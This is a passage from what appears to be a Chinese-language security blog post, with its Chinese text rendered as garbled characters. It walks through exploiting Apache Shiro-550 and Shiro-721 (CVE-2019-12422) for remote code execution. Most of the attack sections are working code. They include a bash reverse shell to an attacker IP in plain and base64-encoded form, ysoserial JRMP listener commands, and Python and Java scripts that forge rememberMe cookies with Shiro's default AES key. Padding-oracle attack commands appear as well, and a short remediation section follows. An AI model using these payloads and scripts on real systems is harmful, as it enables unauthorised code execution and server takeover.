BufferedInputStream(bais);</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);</span><br><span class="line">            @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span><br><span class="line">            T deserialized = (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            return deserialized;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            String msg = &quot;Unable to deserialze argument byte array.&quot;;</span><br><span class="line">            throw new SerializationException(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² readObjetcæ–¹æ³•ï¼Œç”±äºååºåˆ—åŒ–çš„å¯¹è±¡å®Œå…¨ç”±å¤–éƒ¨rememberMe Cookieæ§åˆ¶ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æ·»åŠ äº†æœ‰æ¼æ´çš„åŒ…æˆ–è€…åº“å¦‚common-collectionsåŒ…ï¼Œå°±ä¼šé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</li>
</ul>
<h5 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h5><ul>
<li><a href="https://github.com/frohoff/ysoserial.git" target="_blank" rel="noopener">ysoserial</a></li>
<li><a href="https://github.com/insightglacier/Shiro_exploit" target="_blank" rel="noopener">Shiro_exploit</a>_</li>
</ul>
<h5 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h5><ul>
<li>æ£€æµ‹æ˜¯å¦å­˜åœ¨é»˜è®¤çš„keyï¼Œä½¿ç”¨Shiro_exploitæ¥è·å–key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http://you_ip:8080</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-aes-key.png" alt="550-aes-key"></p>
<ul>
<li><p>å¯é€šè¿‡Burpsuiteçš„Burp Collaborator Clientè¿›è¡ŒDNSlogæµ‹è¯•(é»˜è®¤ä¼šæœ‰TTLç¼“å­˜æœºåˆ¶ï¼Œé»˜è®¤10s)</p>
<ul>
<li>å…ˆç”Ÿæˆä¸€ä¸ªPayloadï¼ŒCopy to clipboarè¿›è¡Œå¤åˆ¶</li>
<li>é€šè¿‡shiro.pyè„šæœ¬è¿›è¡Œç”Ÿæˆéœ€è¦çš„payload</li>
<li>æ”¾å…¥Cookieä¸­è¿›è¡Œé‡æ”¾  -&gt;  å¯ä»¥å‘ç°å›åŒ…æœ‰ä¸¤ä¸ªRemember=DeleteMe</li>
<li>åœ¨Burp Collaborator Clientä¸­ç‚¹å‡»Poll nowæŸ¥çœ‹æ˜¯å¦æœ‰å›æ˜¾ä¿¡æ¯</li>
<li>â–² è¿™é‡Œå› ä¸ºè„šæœ¬çš„åŸå› ï¼Œæš‚æ— æ³•ç¼–è¯‘å‡ºpayloadï¼Œå€Ÿç”¨ä¸€äº›å¤§ä½¬çš„å›¾ç‰‡</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-dnslog.png" alt="550-burp-dnslog"></p>
</li>
</ul>
<h5 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h5><ul>
<li>é¦–å…ˆé€šè¿‡shiro_exp_payload.pyç”Ÿæˆçš„payloadè®¿é—®æ”»å‡»ç«¯å£6666</li>
<li>ç«¯å£6666æ”»å‡»æœºé€šè¿‡CommonsCollections5æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åå¼¹shellç»™éœ€è¦åå¼¹çš„æœºå™¨ï¼ˆè¿™é‡Œè¿˜æ˜¯æ”»å‡»æœºä¸è¿‡ç«¯å£æ˜¯9999ï¼‰</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨ä¸€"><a href="#æ¼æ´åˆ©ç”¨ä¸€" class="headerlink" title="æ¼æ´åˆ©ç”¨ä¸€"></a>æ¼æ´åˆ©ç”¨ä¸€</h5><ul>
<li><p>åˆ¶ä½œåå¼¹shell</p>
<ul>
<li><p>ç›‘å¬æœ¬åœ°ç«¯å£<code>nc -nvlp 9999</code></p>
</li>
<li><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Java Runtime</a> é…åˆbashç¼–ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.71.47/9999 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-runtime-bash.png" alt="550-java-runtime-bash"></p>
</li>
</ul>
</li>
<li><p>é€šè¿‡ysoserialçš„JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬6666ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;</span><br><span class="line"></span><br><span class="line">â–² Windowä¸‹å•å¼•å·éœ€æ”¹ä¸ºåŒå¼•å·ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨shiro.pyç”Ÿæˆpayloadï¼ˆå€Ÿç”¨å¤§ä½¬çš„shiro.pyè„šæœ¬ï¼‰</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.71.47:6666</span><br><span class="line"></span><br><span class="line">Payload:rememberMe=uCkSNSu3SJ65fQlfsjIhZ3Jsa+mLKp0grAJZik4iZm4aeWC48j5RFAZBDlFXEwHum5AHRr3n0JeI+QyUwYwjbXv3iA5zw8D9Ny6PWcndXnQa1+eDxaiEpGtYuRw92gd6MQeHTqh34/tOM0GLYcgzltFikbLgmA2y0SED1Bsz4UsCWn846cWh37JcRk2V+zMB1m8hdSxhtv3mqtuyRoFntAiHmMV8T1LHZd7JBfjZz0+uSol36u6lO6ZZdDIHcqishUTxxeiOlSUcqnbWNKI2nveEyxVNQKJ9gXyAI93zvANYHFI6UTAoYoPLIkViaB0H1Y20JEhZ7knsCEjd8zrezo7xUjPZzh9ZRB6ZR+67b5O2JH/T9rjRh+3vX6HznQZ17YtLON1EMoByXdyoR/pP9Q==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-crypto-data.png" alt="550-crypto-data"></p>
<ul>
<li>æ„é€ æ•°æ®åŒ…ï¼Œä¼ªé€ cookieï¼Œå‘é€Payload</li>
</ul>
<p><img src="/images/middleware/shiro/550-cookie-payload.png" alt="550-cookie-payload"></p>
<ul>
<li>ncç›‘å¬ï¼Œåå¼¹æ‹¿åˆ°shell</li>
</ul>
<p><img src="/images/middleware/shiro/550-shiro-550-shell.png" alt="550-shiro-550-shell"></p>
<ul>
<li>è¡¥å……ï¼Œå¦ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬ï¼Œä¸€æ ·çš„åŸç†</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">import subprocess</span><br><span class="line">import requests</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = &apos;/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(url, rce_command):</span><br><span class="line">    if &apos;://&apos; not in url:</span><br><span class="line">        target = &apos;https://%s&apos; % url if &apos;:443&apos; in url else &apos;http://%s&apos; % url</span><br><span class="line">    else:</span><br><span class="line">        target = url</span><br><span class="line">    try:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  # ç”Ÿæˆpayload</span><br><span class="line">        r = requests.get(target, cookies=&#123;&apos;rememberMe&apos;: payload.decode()&#125;, timeout=10)  # å‘é€éªŒè¯è¯·æ±‚</span><br><span class="line">        print r.text</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generator(command, fp):</span><br><span class="line">    if not os.path.exists(fp):</span><br><span class="line">        raise Exception(&apos;jar file not found!&apos;)</span><br><span class="line">    popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, fp, &apos;CommonsCollections2&apos;, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    poc(&apos;http://127.0.0.1:8080&apos;, &apos;open /Applications/Calculator.app&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="æ¼æ´åˆ©ç”¨äºŒ"><a href="#æ¼æ´åˆ©ç”¨äºŒ" class="headerlink" title="æ¼æ´åˆ©ç”¨äºŒ"></a>æ¼æ´åˆ©ç”¨äºŒ</h5><ul>
<li>ç”Ÿæˆpoc.seræ–‡ä»¶</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"touch /tmp/success"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨ä¹‹å‰çš„AESå¯†é’¥å¯¹Payloadè¿›è¡ŒåŠ å¯†ï¼Œä½¿ç”¨Javaçš„POC</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">"d://poc.ser"</span>));</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¼–è¯‘ç”Ÿæˆæœ€åçš„RememberMeï¼Œéœ€è¦shiro-coreçš„jaråŒ…ä»¥åŠslf4j-apiçš„åŒ…</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-cookie-poc.png" alt="550-java-cookie-poc"></p>
<ul>
<li>å‘é€rememberMe Cookieï¼Œå³å¯æˆåŠŸæ‰§è¡Œå‘½ä»¤</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-cookie-poc-ser.png" alt="550-burp-cookie-poc-ser"></p>
<p><img src="/images/middleware/shiro/550-tmp-succsee.png" alt="550-tmp-succsee"></p>
<h5 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h5><ul>
<li><p>â–² æ— è®ºæ˜¯å¦å‡çº§shiroåˆ°1.2.5åŠä»¥ä¸Šï¼Œå¦‚æœshiroçš„rememberMeåŠŸèƒ½çš„AESå¯†é’¥ä¸€æ—¦æ³„éœ²ï¼Œå°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´</p>
</li>
<li><p>å®˜æ–¹ä¿®å¤</p>
<ul>
<li>åˆ é™¤ä»£ç é‡Œçš„é»˜è®¤å¯†é’¥</li>
<li>é»˜è®¤é…ç½®é‡Œæ³¨é‡Šäº†é»˜è®¤å¯†é’¥</li>
<li>å¦‚æœä¸é…ç½®å¯†é’¥ï¼Œæ¯æ¬¡ä¼šé‡æ–°éšæœºä¸€ä¸ªå¯†é’¥</li>
<li>â–² å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å¯¹ååºåˆ—åŒ–åšå®‰å…¨é™åˆ¶ï¼Œåªæ˜¯åœ¨é€»è¾‘ä¸Šå¯¹è¯¥æ¼æ´è¿›è¡Œäº†å¤„ç†ã€‚å¦‚æœåœ¨é…ç½®é‡Œè‡ªå·±å•ç‹¬é…ç½®AESçš„å¯†é’¥ï¼Œå¹¶ä¸”å¯†é’¥ä¸€æ—¦æ³„éœ²ï¼Œé‚£ä¹ˆæ¼æ´ä¾ç„¶å­˜åœ¨</li>
</ul>
</li>
<li><p>æ¼æ´ä¿®å¤çš„æ–¹æ¡ˆåŒæ—¶è¿›è¡Œï¼š</p>
<ul>
<li>å‡çº§shiroåˆ°1.2.5åŠä»¥ä¸Š</li>
<li>å¦‚æœåœ¨é…ç½®é‡Œé…ç½®äº†å¯†é’¥ï¼Œè¯·åˆ©ç”¨å®˜æ–¹æä¾›çš„æ–¹æ³•ç”Ÿæˆå¯†é’¥ï¼š\org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenerateCipherKey</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * éšæœºç”Ÿæˆç§˜é’¥ï¼Œå‚è€ƒorg.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generateNewKey() &#123;</span><br><span class="line">        KeyGenerator kg;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            kg = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException var5) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to acquire AES algorithm.  This is required to function."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(msg, var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kg.init(<span class="number">128</span>);</span><br><span class="line">        SecretKey key = kg.generateKey();</span><br><span class="line">        <span class="keyword">byte</span>[] encoded = key.getEncoded();</span><br><span class="line">        <span class="keyword">return</span> encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h5 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h5><ul>
<li>å‡çº§Shiroåˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>WAFæ‹¦æˆªCookieä¸­é•¿åº¦è¿‡å¤§çš„rememberMeå€¼</li>
</ul>
<h3 id="0X01-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#0X01-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="0X01 Shiro Padding Oracle Attack(Shiro-721)"></a>0X01 Shiro Padding Oracle Attack(Shiro-721)</h3><blockquote>
<p>CVE-2019-12422</p>
</blockquote>
<h5 id="æ¼æ´åŸç†-1"><a href="#æ¼æ´åŸç†-1" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h5><ul>
<li>ç”±äºShiro Cookieä¸­é€šè¿‡AES-128-CBCæ¨¡å¼åŠ å¯†rememberMeå­—æ®µå­˜åœ¨é—®é¢˜ï¼Œç”¨è¿‡å¯é€šè¿‡Padding OracleåŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œåºåˆ—åŒ–æ”»å‡»ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</li>
</ul>
<h5 id="Padding-Oracle-Attackæ”»å‡»åˆ†æ"><a href="#Padding-Oracle-Attackæ”»å‡»åˆ†æ" class="headerlink" title="Padding Oracle Attackæ”»å‡»åˆ†æ"></a>Padding Oracle Attackæ”»å‡»åˆ†æ</h5><ul>
<li>â–² å…³é”®æ€è·¯åœ¨äºé€šè¿‡æ„é€ IVå€¼ï¼ˆä¹Ÿå°±æ˜¯å‰ä¸€ç»„å¯†æ–‡ï¼‰åˆ©ç”¨æœåŠ¡å™¨çš„è¿”å›å€¼ç»“åˆPKCS #5æ¥æ‰¾åˆ°æ­£ç¡®çš„ä¸­é—´å€¼ï¼Œä»è€Œç»•è¿‡åŠ å¯†ç®—æ³•ï¼Œç›´æ¥å¾—åˆ°è§£å¯†åçš„å†…å®¹</li>
<li>ä¸»è¦æ˜¯é€šè¿‡æœåŠ¡å™¨çš„è¿”å›å€¼æ¥åˆ¤æ–­è‡ªå·±çš„æ„å»ºçš„IVå€¼æ˜¯å¦æ­£ç¡®ï¼Œè¿›è€ŒçŒœæµ‹åˆæ­£ç¡®çš„ä¸­é—´å€¼IVå€¼ï¼Œä¸­é—´å€¼IVå†å’Œ è·å–åˆ°çš„åŸæ¥çš„IVå€¼å¼‚æˆ–ä¾¿å¯å¾—åˆ°æ˜æ–‡ï¼Œæ”»å‡»æœ‰ä¸¤ä¸ªé‡è¦çš„å‡è®¾å‰æ<ul>
<li>æ”»å‡»è€…èƒ½å¤Ÿè·å¾—å¯†æ–‡ï¼ˆCiphertextï¼‰ï¼Œä»¥åŠé™„å¸¦åœ¨å¯†æ–‡å‰é¢çš„IVå€¼ï¼ˆåˆå§‹åŒ–å‘é‡ï¼‰</li>
<li>æ”»å‡»è€…èƒ½å¤Ÿè§¦å‘å¯†æ–‡çš„è§£å¯†è¿‡ç¨‹ï¼Œä¸”èƒ½å¤ŸçŸ¥é“å¯†æ–‡çš„è§£å¯†ç»“æœ</li>
</ul>
</li>
<li>èƒ½å¤Ÿ è·å¾—å¯†æ–‡æˆ‘ä»¬æ‰èƒ½å¾—åˆ°æ­£ç¡®çš„æ˜æ–‡ï¼Œè€Œå¯†æ–‡çš„ç¬¬ä¸€ç»„åˆ†ç»„ éœ€è¦æœ‰æ­£ç¡®çš„åˆå§‹å‘é‡æ‰èƒ½è§£å¯†ã€‚èƒ½è§¦å‘å¯†æ–‡çš„è§£å¯†è¿‡ç¨‹æ‰èƒ½åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹ç»•è¿‡åŠ å¯†ç®—æ³•ç›´æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œè€ŒçŸ¥é“å¯†æ–‡çš„è§£å¯†ç»“æœæ˜¯é€šè¿‡æœåŠ¡å™¨è¿”å›å€¼æ¥åˆ¤æ–­ç»“æœæ˜¯ä¸æ˜¯ç¬¦åˆå¡«å……æ ‡å‡†æ¥å®ç°çš„</li>
</ul>
<h5 id="å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-4-2ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-4-2ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.4.2ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.4.2ç‰ˆæœ¬</h5><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li>ç™»å½•Shiroç½‘ç«™ï¼Œä»Cookieä¸­è·å–rememberMeå­—æ®µå€¼</li>
</ul>
<p><img src="/images/middleware/shiro/721-remember-cookie.png" alt="721-remember-cookie"></p>
<ul>
<li>åˆ©ç”¨DNSlogæ¢æµ‹ï¼Œé€šè¿‡ysoserialç”Ÿæˆpayload</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"ping cedp8j.dnslog.cn"</span> &gt; payload.class</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/721-dnslog-payload.png" alt="721-dnslog-payload"></p>
<ul>
<li>ä½¿ç”¨rememberMeå€¼ä½œä¸ºprefixï¼ŒåŠ è½½Payloadï¼Œè¿›è¡Œ<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">Padding Oracle</a>æ”»å‡»</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br><span class="line"></span><br><span class="line">java -jar PaddingOracleAttack.jar http://192.168.67.153:8080/ quT6mlx30kPSeU+sXkH2wXE9d5oWVXkhToumO+4+tICqaWkpBq77H2AFuWz5t7JNHXXre0UfVXFpvk7vjfolR1EkJNftIFLHZ26+cPikj3mp6V2AgEzcyHdgJ/UVaDSyUxNrxpnLpjlfxe1V7X3MCroxSkis6Y/uB2BIN9M4p8mp50RMzlIxOSBNtMY9sJOb48eAo8OO4aTvzMKsFyzaO0fTwcueNxCJqiCdgovpj8vrp3R1CpRIeHwq7ldVBio95bI1Twtuv+Gy6kNDLsV41aeL0RM2tqp2XVgzTQ+Hi3H4kzF2/dzLU7M5Mg7g94uggu/NnV7HCYTX6SYHTRaH729JCEe2OFkYtwVEKk9s9cOxSPxIoLVRSgAZwKRO3CByEqAxm3L4MmuORAgorZf15DC0X1/OeFixLBN85LxitUwOtmFUidnWQQI/YaJDYxOU1+6HITJhHNgpMIKm3P46n06l302+k1vagcIl1BaresGoN93ahagQe2To/Tj33/EyAfVG0NbCu0Olp89aWzTxIw== 16 payload.class</span><br></pre></td></tr></table></figure>

<ul>
<li>çˆ†ç ´æˆåŠŸï¼Œè¾“å‡ºResult</li>
